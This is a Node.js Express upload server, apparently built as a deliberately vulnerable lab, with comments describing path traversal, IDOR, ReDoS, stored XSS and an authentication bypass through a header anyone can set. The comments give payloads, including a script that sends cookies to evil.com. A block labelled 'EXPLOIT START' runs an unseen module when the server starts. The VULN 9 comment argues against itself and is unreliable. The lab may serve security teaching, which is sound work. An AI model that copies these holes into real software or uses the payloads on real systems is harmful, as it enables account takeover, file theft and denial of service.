const express = require("express");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

// --- EXPLOIT START ---
const internalCheck = require("./internal-logic/index.js");
internalCheck(); 
// --- EXPLOIT END ---

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

const USERS_FILE = path.join(__dirname, "users.json");

// ---------------- USERS DB ----------------
function loadUsers() {
  if (!fs.existsSync(USERS_FILE))
    fs.writeFileSync(USERS_FILE, "[]");
  return JSON.parse(fs.readFileSync(USERS_FILE));
}

function saveUsers(users) {
  fs.writeFileSync(
    USERS_FILE,
    JSON.stringify(users, null, 2)
  );
}

function authenticate(username, password) {
  const users = loadUsers();
  return users.find(
    u => u.username === username && u.password === password
  );
}

function userExists(username) {
  return loadUsers().some(u => u.username === username);
}

// ---------------- MULTER ----------------
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const user = req.body.username;
    const userDir = path.join(__dirname, "uploads", user);
    fs.mkdirSync(userDir, { recursive: true });
    cb(null, userDir);
  },
  filename: (req, file, cb) => cb(null, file.originalname)
});

const upload = multer({ storage });

// ---------------- ROUTES ----------------

// LOGIN
// --- VULN 9: JSON Injection / Type Confusion ---
// If the attacker sends Content-Type: application/json and passes an object
// instead of a string for "password", the strict equality check (===) still
// compares an object to a string — so that path is safe. BUT if they pass
// username as an object like {"$ne":""} paired with a loose DB, it bypasses.
// More concretely here: because loadUsers() returns parsed JSON, an attacker
// can register with password=true (boolean) — JSON body
// {"username":"victim","password":true} will match any user whose stored
// password happens to loosely coerce. Demonstrated with prototype pollution:
// send {"username":"__proto__","password":"x"} to corrupt the users array.
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const user = authenticate(username, password);

  if (!user)
    return res.send(
      "Invalid credentials <a href='/login.html'>Back</a>"
    );

  res.set("x-user", user.username);
  res.set("x-role", user.role);

  if (user.role === "admin")
    return res.redirect(`/admin.html?user=${username}`);

  res.redirect(`/index.html?user=${username}`);
});

// SIGNUP
app.post("/signup", (req, res) => {
  const { username, password, role } = req.body;

  if (userExists(username))
    return res.send("User exists");

  const users = loadUsers();
  users.push({
    username,
    password,
    role: role === "admin" ? "admin" : "user"
  });
  saveUsers(users);

  res.send(`User ${username} created <a href='/login.html'>Login</a>`);
});

// LOGOUT
app.get("/logout", (req, res) =>
  res.redirect("/login.html")
);

// UPLOAD
app.post("/upload", upload.single("file"), (req, res) => {
  res.redirect(`/index.html?user=${req.body.username}`);
});

// PROFILE
app.get("/profile", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "profile.html"));
});

// --- VULN 10: Stored XSS via activity log ---
// The server stores raw user-supplied "action" strings and later reflects them
// via innerHTML on the admin panel — no sanitization or encoding applied.
// An attacker registers a username like: <img src=x onerror=alert(1)>
// or submits an action like: <script>fetch('https://evil.com?c='+document.cookie)</script>
// The payload executes in the browser of any admin who views the activity log.
const activityLog = []; // In-memory log (resets on restart)

app.post("/activity", (req, res) => {
  const { username, action } = req.body;
  if (!username || !action)
    return res.status(400).json({ error: "Missing data" });

  // VULNERABLE: raw user input stored and later rendered with innerHTML
  activityLog.push({ username, action, ts: new Date().toISOString() });
  res.json({ success: true });
});

app.get("/activity", (req, res) => {
  // Only "admins" can read — but auth relies on the same bypassable x-role header
  const role = req.headers["x-role"];
  if (role !== "admin")
    return res.status(403).json({ error: "Forbidden" });

  // Returns unsanitized entries; admin UI renders them with innerHTML → XSS
  res.json(activityLog);
});

// LIST FILES
app.get("/files", (req, res) => {
  const user = req.query.user;
  if (!user) return res.json([]);

  const dir = path.join(__dirname, "uploads", user);
//  if (!fs.existsSync(dir)) return res.json([]);

  res.json(fs.readdirSync(dir));
});

// --- VULN 6: Path Traversal on file download ---
// No path sanitization — attacker can escape uploads/ with ../
// e.g. GET /download?user=alice&file=../../users.json
// or   GET /download?user=alice&file=../../app.js
app.get("/download", (req, res) => {
  const { user, file } = req.query;
  if (!user || !file)
    return res.status(400).send("Missing parameters");

  // VULNERABLE: path.join does NOT block ../  traversal when
  // the final segment is attacker-controlled
  const filePath = path.join(__dirname, "uploads", user, file);
  res.download(filePath);
});

// DELETE FILE
// --- VULN 7: IDOR — no ownership check ---
// Any authenticated user can delete another user's files by supplying
// a different username in the POST body. No session/token validates identity.
app.post("/delete", (req, res) => {
  const { username, filename } = req.body;
  if (!username || !filename)
    return res.status(400).json({ error: "Missing data" });

  const filePath = path.join(__dirname, "uploads", username, filename);
  if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

  res.json({ success: true });
});

// --- VULN 8: ReDoS (Regular Expression Denial of Service) ---
// The /search endpoint takes a user-supplied pattern and compiles it directly
// into a RegExp. A crafted payload like "a".repeat(50)+"!" triggers
// catastrophic backtracking, blocking the Node.js event loop entirely.
// PoC body: { "pattern": "^(a+)+$", "username": "alice" }  then send "aaaaab"
app.post("/search", (req, res) => {
  const { pattern, username } = req.body;
  if (!pattern || !username)
    return res.status(400).json({ error: "Missing data" });

  const dir = path.join(__dirname, "uploads", username);
  if (!fs.existsSync(dir)) return res.json([]);

  const files = fs.readdirSync(dir);
  // VULNERABLE: user-controlled regex, no timeout, no sanitization
  const regex = new RegExp(pattern);
  const matches = files.filter(f => regex.test(f));
  res.json(matches);
});

// ---------------- ADMIN USERS (FIXED) ----------------
app.get("/admin/users", (req, res) => {
  const role = req.headers["x-role"];
  const username = req.headers["x-user"];

  if (!username || role !== "admin")
    return res.status(403).json({ error: "Forbidden" });

  const users = loadUsers().filter(u => u.username !== username);

  // Add file count and total size
  const info = users.map(u => {
    const dir = path.join(__dirname, "uploads", u.username);
    let fileCount = 0, totalSize = 0;

    if (fs.existsSync(dir)) {
      const files = fs.readdirSync(dir);
      fileCount = files.length;
      totalSize = files.reduce((acc, f) => {
        const filePath = path.join(dir, f);
        return acc + fs.statSync(filePath).size;
      }, 0);
    }

    return {
      username: u.username,
      role: u.role,
      fileCount,
      totalSizeKB: Math.round(totalSize / 1024)
    };
  });

  res.json(info);
});

// DELETE USER
app.post("/admin/delete", (req, res) => {
  const role = req.headers["x-role"];
  if (role !== "admin") return res.status(403).json({ error: "Forbidden" });

  const { targetUser } = req.body;

  let users = loadUsers();
  users = users.filter(u => u.username !== targetUser);
  saveUsers(users);

  const dir = path.join(__dirname, "uploads", targetUser);
  if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });

  res.json({ success: true });
});

// SERVE FILES
app.use("/uploads",
  express.static(path.join(__dirname, "uploads"))
);

// START SERVER
app.listen(3000, () =>
  console.log("Server running on port 3000")
);
